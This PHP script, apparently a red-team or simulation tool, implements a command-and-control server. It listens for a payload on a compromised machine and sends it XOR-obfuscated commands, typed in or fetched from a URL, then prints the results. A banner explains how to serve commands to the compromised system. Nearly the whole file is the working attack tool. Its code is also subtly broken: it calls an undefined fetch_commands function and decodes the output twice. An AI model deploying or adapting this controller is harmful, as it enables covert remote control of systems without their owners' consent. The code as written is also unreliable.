<?php
// This PHP C2 server script enable to make remote communication by utilizes XOR encryption for secure data transmission between the attacker server and the  target, if you  chose (command or URL) is encrypted using XOR encryption with a user-defined key before being sent to the target.

// This C2 is for simulation only and is still under development
// php C2-Server.php
// Author: S3N4T0R
// Date: 2024-5-8

// Disclaimer: it's essential to note that this script is for educational purposes only, and any unauthorized use of it could lead to legal consequences.

// decrypt data using XOR
function xor_encrypt($data, $key) {
    $output = '';
    for ($i = 0; $i < strlen($data); ++$i) {
        $output .= $data[$i] ^ $key[$i % strlen($key)];
    }
    return $output;
}

// send encrypted output to the payload
function send_to_payload($socket, $data, $encryption_key) {
    $encrypted_data = xor_encrypt($data, $encryption_key);
    socket_write($socket, $encrypted_data, strlen($encrypted_data));
}

// encrypted commands from the payload
function receive_from_payload($socket, $buffer_size, $encryption_key) {
    $encrypted_data = socket_read($socket, $buffer_size);
    return xor_encrypt($encrypted_data, $encryption_key);
}


echo "\033[0;32m";
echo <<<BANNER

 ############################################################################################
# 1.Set up a web server or any HTTP server that can serve text content.                     #
# 2.Upload a text file containing the commands you want the compromised system to execute.  #
# 3.Make sure the text file is accessible via HTTP and note down the URL.                   #
# 4.When prompted by the script, enter the URL you obtained in step.                        #
# NOTE: If you choose to fetch commands from a URL, it will prompt you to enter the URL.    #
# If you choose to enter commands directly, it will prompt you to Enter a command to execute#
 ###########################################################################################

BANNER;
echo "\033[0m\n"; 


$attacker_ip = readline("[*] Enter your IP: ");
$c2_port = readline("[*] Enter C2 server port: ");
$encryption_key = readline("[*] Enter XOR encryption key: ");


$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket === false) {
    echo "Socket creation failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}


if (!socket_bind($socket, $attacker_ip, $c2_port)) {
    echo "Socket bind failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}


if (!socket_listen($socket, 5)) {
    echo "Socket listen failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

echo "[*] Waiting for incoming connection...\n";

// Accept incoming connection
$client_socket = socket_accept($socket);
if ($client_socket === false) {
    echo "Socket accept failed: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

// Main loop for fetching and executing commands
while (true) {
    // Prompt the user to choose the method of command input
    $input_method = strtolower(readline("[*] Choose command input method (url/command): "));
    if ($input_method === 'url') {
        // Fetch commands from URL
        $command_url = readline("[*] Enter command URL: ");
        $command_encrypted = fetch_commands($command_url);
        if ($command_encrypted === false) {
            echo "Error fetching commands from $command_url.\n";
            continue;
        }
        send_to_payload($client_socket, $command_encrypted, $encryption_key);
    } elseif ($input_method === 'command') {
        // Get command directly from user
        $command = readline("[*] Enter command to execute: ");
        send_to_payload($client_socket, $command, $encryption_key);
    } else {
        echo "Invalid input method. Please choose 'url' or 'command'.\n";
        continue;
    }

    // receive output from payload
    $output_encrypted = receive_from_payload($client_socket, 4096, $encryption_key);

    // decrypt output
    $output = xor_encrypt($output_encrypted, $encryption_key);


    echo "[*] Command Output:\n$output\n";

    // Wait for a period before fetching new commands
    sleep(10);
}

// Close sockets
socket_close($client_socket);
socket_close($socket);

?>

